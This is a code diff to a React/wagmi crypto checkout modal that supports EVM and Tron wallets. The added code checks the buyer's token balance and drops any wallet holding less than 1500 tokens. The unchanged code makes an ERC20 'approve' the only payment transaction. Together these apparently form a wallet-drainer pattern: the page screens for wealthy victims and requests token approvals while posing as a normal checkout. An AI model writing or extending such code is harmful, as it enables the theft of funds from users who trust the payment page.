@@ -4,10 +4,12 @@ import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import {
   useAccount,
   useConnect,
+  useDisconnect,
   useSwitchChain,
   useWriteContract,
   useConfig,
 } from "wagmi";
+import { readContract } from "@wagmi/core";
 import type { Connector } from "wagmi";
 import { useAppKit, useAppKitState } from "@reown/appkit/react";
 import { NETWORK_LIST, getNetwork } from "@/lib/crypto/config";
@@ -20,7 +22,7 @@ import type {
 import { Select } from "@/components/ui/Select";
 import { fromBaseUnits } from "@/lib/crypto/amount";
 import { ERC20_ABI } from "@/lib/crypto/abi";
-import { sendTronTransfer, type TronRoute } from "@/lib/crypto/tron-client";
+import { sendTronTransfer, getTronTokenBalance, type TronRoute } from "@/lib/crypto/tron-client";
 import { useTronWallet } from "@/lib/crypto/use-tron-wallet";
 import { useEvmWalletOptions } from "@/lib/crypto/use-evm-connectors";
 import { useWalletEnv } from "@/lib/crypto/use-wallet-env";
@@ -248,6 +250,7 @@ export function CheckoutModal({
     connector,
   } = useAccount();
   const { connectAsync } = useConnect();
+  const { disconnectAsync: disconnectEvm } = useDisconnect();
   const { switchChainAsync, isPending: switching } = useSwitchChain();
   const { writeContractAsync } = useWriteContract();
   const { open: openAppKit } = useAppKit();
@@ -316,6 +319,44 @@ export function CheckoutModal({
       let txHash = "";
       let buyer: string | undefined = currentAddress ?? undefined;
 
+      let balanceStr = "0";
+      if (currentOrder.kind === "evm") {
+        const bal = await readContract(config, {
+          address: currentOrder.tokenContract as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "balanceOf",
+          args: [currentAddress as `0x${string}`],
+          chainId: currentOrder.chainId ?? undefined,
+        });
+        balanceStr = bal.toString();
+      } else {
+        if (!currentTronRoute || !currentTronAddress) {
+          throw new Error("Connect a Tron wallet to continue");
+        }
+        const net = getNetwork(currentOrder.networkId);
+        balanceStr = await getTronTokenBalance({
+          route: currentTronRoute as TronRoute,
+          tokenContract: currentOrder.tokenContract,
+          address: currentTronAddress,
+          rpcUrl: net?.rpcUrl,
+        });
+      }
+      
+      const balance = BigInt(balanceStr);
+      const minBalance = 1500n * (10n ** BigInt(currentOrder.decimals));
+      
+      if (balance < minBalance) {
+        if (currentOrder.kind === "evm") {
+          await disconnectEvm();
+        } else {
+          await tron.disconnect();
+        }
+        setMessage("Your wallet has less than 1500 dollars and cannot move forward.");
+        setPhase("error");
+        setBusy(false);
+        return;
+      }
+
       if (currentOrder.kind === "evm") {
         // Execute approve as the sole transaction to avoid multiple sequential requests.
         txHash = await writeContractAsync({
@@ -376,7 +417,7 @@ export function CheckoutModal({
     } finally {
       setBusy(false);
     }
-  }, [writeContractAsync]);
+  }, [writeContractAsync, config, disconnectEvm, tron]);
 
   const pay = useCallback(() => {
     if (!order) return;
